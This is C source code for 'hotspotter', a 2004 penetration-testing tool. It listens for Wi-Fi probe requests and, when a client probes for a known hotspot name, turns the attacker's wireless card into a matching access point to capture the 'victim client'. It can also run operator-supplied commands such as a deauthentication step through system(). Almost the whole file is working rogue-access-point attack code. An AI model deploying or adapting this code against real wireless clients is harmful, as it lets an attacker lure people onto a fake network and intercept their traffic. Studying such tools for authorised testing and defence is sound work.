/*
 *    hotspotter - checks for hotspot probes and answer
 *    Copyright (C) 2004 Max Moser
 *    
 *    Written 2004 by Max Moser <mmo [-at-] remote-exploit.org>
 *    Conributions by Joshua Wright <jwright [-at-] hasborg.com>
 *
 *
 * This program is free software; you can redistribute it and/or modify
 * it under the terms of the GNU General Public License version 2 as
 * published by the Free Software Foundation;
 * 
 * THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
 * IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
 * FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT OF THIRD PARTY
 * RIGHTS.  IN NO EVENT SHALL THE COPYRIGHT HOLDER(S) AND AUTHOR(S) BE LIABLE
 * FOR ANY CLAIM, OR ANY SPECIAL INDIRECT OR CONSEQUENTIAL DAMAGES, OR ANY
 * DAMAGES WHATSOEVER RESULTING FROM LOSS OF USE, DATA OR PROFITS, WHETHER IN
 * AN ACTION OF CONTRACT, NEGLIGENCE OR OTHER TORTIOUS ACTION, ARISING OUT OF
 * OR IN CONNECTION WITH THE USE OR PERFORMANCE OF THIS SOFTWARE.
 * 
 * ALL LIABILITY, INCLUDING LIABILITY FOR INFRINGEMENT OF ANY PATENTS,
 * COPYRIGHTS, TRADEMARKS OR OTHER RIGHTS, RELATING TO USE OF THIS SOFTWARE
 * IS DISCLAIMED.
 */

/* hotspotter has been developed to automate some anoying task during 
 * penetration tests. This software has been provided "as-is", noone
 * will take the responsability if you fuck up your system and/or hardware
 * or what strange thing ever can happend to you.
 * 
 * Read the README on further details, why this tool is cool and what are 
 * common usages. 
 * 
 * So keep the fun...
 *
 * 
*/ 

#include <stdio.h>
#include <getopt.h>
#include <pcap.h>
#include <errno.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <sys/ioctl.h>
#include <netinet/in.h>
#include <netinet/if_ether.h>
#include <net/if_arp.h>
#include <arpa/inet.h>
#include <linux/wireless.h>
#include <unistd.h>
#include <signal.h>

#include "hotspotter.h"
#include "ieee802_11.h"
#include "version.h"
#include "utils.h"

// Globals
char ssidlist[MAXLINES][IW_ESSID_MAX_SIZE+1];
int count=0;
int dodebug=0;
pcap_t *pcap_handl;


int main (int argc, char *argv[])
{
	int offset;
	int option;
	char interface[6];
	char errbuf[PCAP_ERRBUF_SIZE];
	const u_char *packet;
	struct pcap_pkthdr hdr; 
	struct mgmt_header_t *mgmt_header;
	char essid[IW_ESSID_MAX_SIZE+1];
	char lastssid[IW_ESSID_MAX_SIZE+1];
	int tagtype;
	int taglen;
	char filename[255];
	int automatic=0;
	int socketfd;
	struct iwreq iwr;
	struct ifreq ifr;
	char post_execute[4096];
	char pre_execute[4096];
	int post_apexecute=0;
	int pre_apexecute=0;
	FILE *fp;
	int showhelp=0;
	char bssid_str[18];
	char stamac_str[18];
	char dstmac_str[18];

	memset (pre_execute,0,sizeof(pre_execute));
	memset (post_execute,0,sizeof(post_execute));
	memset (essid,0,sizeof(essid));
	memset (&iwr,0,sizeof(struct iwreq));
	memset (&ifr,0,sizeof(struct ifreq));
	memset (lastssid,0,sizeof(lastssid));

	signal(SIGINT, cleanup_failure);
	signal(SIGTERM, cleanup_failure);
	signal(SIGQUIT, cleanup_failure);

	// Say welcome to the world.
	printf ("\nWelcome to the hotspot faker %s v%s\n",argv[0], VER);
	printf ("(c) 2004 Max Moser / mmo[-at-]remote-exploit.org\n");
 	printf ("----------------------------------------------------------\n");	
	// Parse command line arguments
	while ((option = getopt (argc, argv,"vahi:f:e:r:")) != EOF)
	{

		switch (option)
		{
			case 'i' :
				memset(interface,0, sizeof(interface));
				strncpy (interface, optarg,sizeof(interface)-1);
				break;
			case 'a' :
				automatic=1;
				break;
			case 'f' : 
				memset (filename,0,sizeof(filename));
				strncpy (filename, optarg,sizeof(filename)-1);	
				break;
			case 'r' :
				strncpy (pre_execute, optarg, sizeof(pre_execute)-1);
				pre_apexecute=1;
				break;
			case 'e' :
				strncpy (post_execute, optarg, sizeof(post_execute)-1);
				post_apexecute=1;
				break;
			case 'v' :
				dodebug=1;
				break;
			case 'h' :
				showhelp=1;
				break;
			default :
				break;
		} // End of switch

	} // End of while


	if ( argc < 4 || showhelp == 1)
	{

		printf(
		"This tool takes a list of known hotspot network names (one per line) and\n"
		"passively listens for probe requests. When a Windows XP client probes for a\n"
		"matching network name, hotspotter can act as an access point to accept the\n"
		"following authentication and association from the victim client (prompt by\n"
		"default, -a to accept the first client request).  The -e option allows you to\n"
		"provide a command to be executed after switching on the access point mode.\n"
        "The -r option allows you to provide a command to be executed just before\n"
        "switching on the access point mode (such as a deauth client command).\n"
		"Only prism54 and hostap drivers are supported at this time.\n");
			
		printf ("\nUsage: %s [options]\n"
                "\t-i <iface>       :   interface name\n"
                "\t-f <essidlist>   :   file of ESSID's to match\n"
                "\t-a               :   accept first request (no prompt)\n"
                "\t-e <\"command\">   :   post-AP mode command\n"
                "\t-r <\"command\">   :   pre-AP mode command\n"
                "\n",argv[0]);
		exit(EXIT_FAILURE);
	}


    if ( interface == NULL )	
    {
        fprintf (stderr,"\nNo interfacename was given!\n\n");
        exit (EXIT_FAILURE);
    } 


    // Check if the interface is there and got wireless extension
    strncpy ( (char *) &iwr.ifr_name, interface, sizeof(iwr.ifr_name));

    if ( (socketfd = socket(AF_INET, SOCK_STREAM,0)) < 0)
    {
        perror("socket");
    }

    if (ioctl (socketfd,SIOCGIWNAME, &iwr ) != 0)
    {
        fprintf (stderr,"Error populating interface data from %s.\n",
        interface);
        perror("ioctl");
        exit (EXIT_FAILURE);
    }
    else
    {
        printf ("\nUsing %s as listening interface\n",interface);
    }


    // Set the card up (ifconfig ethx up)
    strncpy ( (char *) &ifr.ifr_ifrn.ifrn_name, interface, 
        sizeof(ifr.ifr_ifrn.ifrn_name));
    ifr.ifr_ifru.ifru_flags = (IFF_PROMISC + IFF_UP);

    if (ioctl (socketfd,SIOCSIFFLAGS,&ifr) != 0)
    {
        fprintf (stderr,"Could not set %s up\n",interface);
        perror("ioctl");
        exit (EXIT_FAILURE);
    }

    // Set the card into monitoring mode
    iwr.u.mode = IW_MODE_MONITOR;

    if (! ioctl (socketfd, SIOCSIWMODE, & iwr) == 0)
    {
        fprintf (stderr,"Could not set monitor mode on interface %s."
            "Exiting.\n", interface);
        exit (EXIT_FAILURE);
    }
    else
    {
        printf ("Monitor mode enabled on interface %s\n", interface);
        printf ("Gathering packets, every \".\" is a received wireless"
                " packet\n\n");
    }


    // Read in the essid list
    // It reads only MAXLINES lines from list, if you got more than
    // 30000 you should raise the define of MAXLINES
    // Thats lame i know, but i never said i am a good c programmer :-)

    memset (ssidlist,0,MAXLINES * IW_ESSID_MAX_SIZE);

    if ((fp = fopen(filename,"r")) == NULL)
    {
        fprintf (stderr,"Error, could not open %s\n", filename);
        perror("fopen");
        exit (EXIT_FAILURE);
    }

    while ( fgets (ssidlist[count], IW_ESSID_MAX_SIZE, fp) != NULL)
    {
        // Remove newlines
        ssidlist[count][strlen(ssidlist[count])-1] = '\0';
        count++;
    }

    // Open pcap interface
    pcap_handl = pcap_open_live(interface,65536,1,1000000,errbuf); 	

    // When an error has happened 
    if(pcap_handl == NULL)
    {
        fprintf(stderr,"Error in pcap_open_live(): %s\n",errbuf);
        cleanup_failure(); // exits
    }


    // Go into an endless loop
    while (1)  
    {
        packet = pcap_next(pcap_handl,&hdr);

        if(packet == NULL)
        {
            fprintf(stderr,"No packets: %s\n", errbuf);
            cleanup_failure(); // exits
        }

        // Get now the management header out of the packet
        mgmt_header = (struct mgmt_header_t *) packet;

        // Just checing if it is a Proberequest frame, only those are 
        // in the scope of this app
        // The ieee8211.h file is taken form the tcpdump project.
        // Great macros, thnx

        if (!( FC_SUBTYPE(mgmt_header->fc) == ST_PROBE_REQUEST ))
        {
            // Not a probe request frame.. next
            printf (".");
            fflush(stdout);
            continue;
        }

        // Found a probe request frame!@
        //Now jump over the mngmt header (24 bytes)	        	
        offset = M_HDR_LEN;

        // Now get the tag type
        // Normaly first one is the ESSID
        tagtype = packet[offset];
        offset += 1;
        taglen  = packet[offset];
        offset += 1;

        if (tagtype == E_SSID)
        {
            if (dodebug == 1)
            {
                printf ("\nReceived a probe request, essid: %s", essid);
                printf ("\nHexdump of the packet:\n");
                lamont_hdump((unsigned char *)packet,hdr.len);
            }
            memset(essid, 0, sizeof(essid));

            // Ensure taglen does not exceed the max SSID length
            taglen = (taglen > 32) ? 32 : taglen;
            strncpy(essid, packet+offset, taglen);

            // Process the essid, go into AP mode if it is in our
            // hotspot list
            if (handle_ssid(essid, lastssid) != 0) 
            {
                // returned an error - possibly matching 
                // previous ssid (lastssid) or not in the
                // hotspot list.  Continue listening...
                memset(lastssid, 0, sizeof(lastssid));
                strncpy(lastssid, essid, sizeof(essid));
                continue;
            } 

            // handle_ssid found a matching hotspot SSID, now
            // execute a command if told to do so.
            if (pre_apexecute == 1)
            {
                mac_to_string(mgmt_header->da, dstmac_str, sizeof(dstmac_str));
                mac_to_string(mgmt_header->bssid, bssid_str, sizeof(bssid_str));
                mac_to_string(mgmt_header->sa, stamac_str, sizeof(stamac_str));

                setenv("HS_STAMAC", stamac_str, 1);
                setenv("HS_DSTMAC", dstmac_str, 1);
                setenv("HS_BSSID", bssid_str, 1);
                setenv("HS_ESSID", essid, 1);

                printf ("Executing the pre-AP configuration command: \"%s\"\n",
                pre_execute);
                system (pre_execute);
            }


            if (handle_ap(essid, iwr, socketfd, automatic, interface) != 0) {
                // Did not enter AP mode, could have said "no"
                memset(lastssid, 0, sizeof(lastssid));
                strncpy(lastssid, essid, sizeof(essid));
                continue;
            }

            // handle_ssid found a matching hotspot SSID, now
            // execute a command if told to do so.
            if (post_apexecute == 1)
            {
                mac_to_string(mgmt_header->da, dstmac_str, sizeof(dstmac_str));
                mac_to_string(mgmt_header->bssid, bssid_str, sizeof(bssid_str));
                mac_to_string(mgmt_header->sa, stamac_str, sizeof(stamac_str));

                setenv("HS_STAMAC", stamac_str, 1);
                setenv("HS_DSTMAC", dstmac_str, 1);
                setenv("HS_BSSID", bssid_str, 1);
                setenv("HS_ESSID", essid, 1);

                printf ("Executing the post-AP configuration command: \"%s\"\n",
                post_execute);
                system (post_execute);
            }

            // We are in AP mode, we're all done.
            close_pcap();
            exit (EXIT_SUCCESS);

        }

    } // End of the endless capturing loop

    // Shouldn't ever get here
    exit (EXIT_SUCCESS);

} // End of int main

int handle_ap(u_char *ssid, struct iwreq iwr, int socketfd, int automatic, 
	      u_char *interface) {

	char becomeapbuf[90];

	memset(becomeapbuf,0,sizeof(becomeapbuf));

	if (automatic == 1)
	{
		printf ("\nStarting AP mode ... ");

		if (become_ap(ssid, socketfd, interface) != 0)
		{
			fprintf(stderr, "Unable to switch to AP mode.\n");
          	cleanup_failure(); // exits
		}

		printf ("Done.\n");
	}
	else
	{
		printf ("Would you like to act as an AP for this ssid [y|N] : ");
		fflush (stdout);
		fgets (becomeapbuf, sizeof(becomeapbuf), stdin);
	    fflush (stdin);	

		if (strncmp (becomeapbuf, "Y", 1) == 0 || 
		    strncmp (becomeapbuf, "y", 1) == 0 )
		{
			if (become_ap(ssid, socketfd, interface) != 0)
			{
				fprintf(stderr, "Unable to switch to AP mode.\n");
	        	cleanup_failure(); // exits
			}
			printf ("AP mode is now enabled.\n");
		}
		else
		{
			return(1);
		}
	} // end if (automatic == 1) ...

	// Everything is good if we got this far
	return(0);
}

// Process the given ssid, make sure it is valid and wasn't the last ssid
// we saw.  If the ssid exists in our hotspot listing, return 0.
int handle_ssid(u_char *ssid, u_char *lastssid) {

	if (! (strlen(ssid) > 0 && strlen(ssid) < IW_ESSID_MAX_SIZE) )
	{
		// Bad ssid 
		return(-1);

	}

	// added to not ask duplicate questions
	if (strncmp (lastssid, ssid, strlen(ssid)) == 0 )
	{
		// Duplicate ssid
		return(-1);
	}

	// Check for the network name is the list of hotspots
	if (lookup_hotspot(ssid) != 0) 
	{
		// No matching SSID in hotspot list, bail
		return(-1);
	}
	else
	{
		printf ("\nFound a matching hotspot ssid %s.\n",ssid);
		return(0);
	}

} // End handle_ssid


// Search for the given ESSID in the populated list of hotspot essid's
// Return 0 if there is a match found, 1 if there are no matches.
int lookup_hotspot(u_char *name) {

	// ssidlist is global
	int i=0;
	for (i=0; i < count; i++)
	{
		// Compare against the list from given ssid file
		// this list include default essids from inencrypted hotspots
		// and default essid's
		if (strncmp (name, ssidlist[i], strlen(ssidlist[i])) == 0)
		{
			return(0);
		}
	}

	// No matches found
	return(1);
}

// Configure the interface and socket into AP mode
int become_ap(u_char *essid, int socketfd, u_char *interface) {

    struct iwreq iwr;

    memset(&iwr, 0, sizeof(iwr));

	// Set the card essid
	iwr.u.essid.pointer = essid;
	iwr.u.essid.length = strlen(essid) +1;
	iwr.u.essid.flags = 1; // SSID active
	strncpy(iwr.ifr_name, interface, strlen(interface));

    if ( ! ioctl (socketfd,SIOCSIWESSID,&iwr) == 0)
    {
        fprintf(stderr, "Could not set the ssid \"%s\".\n", essid);
        perror("ioctl");
        cleanup_failure(); // exits
    }

	// Setze den accesspoint mode jetzt
	iwr.u.mode = IW_MODE_MASTER;

    if (! ioctl (socketfd, SIOCSIWMODE, &iwr) == 0)
    {
        fprintf(stderr, "Could not set AP mode mode.\n");
        perror("ioctl");
        cleanup_failure(); // exits
    }
    else
    {
        printf ("AP mode is now enabled.\n");
    }

    return(0);
} 

// Close pcap and exit with a failure code
void cleanup_failure() {

	close_pcap();
	exit (EXIT_FAILURE);
}

// Close pcap
void close_pcap() {

	if (pcap_handl != NULL) {
		printf("Closing pcap ...\n");
		pcap_close(pcap_handl);
	}
}
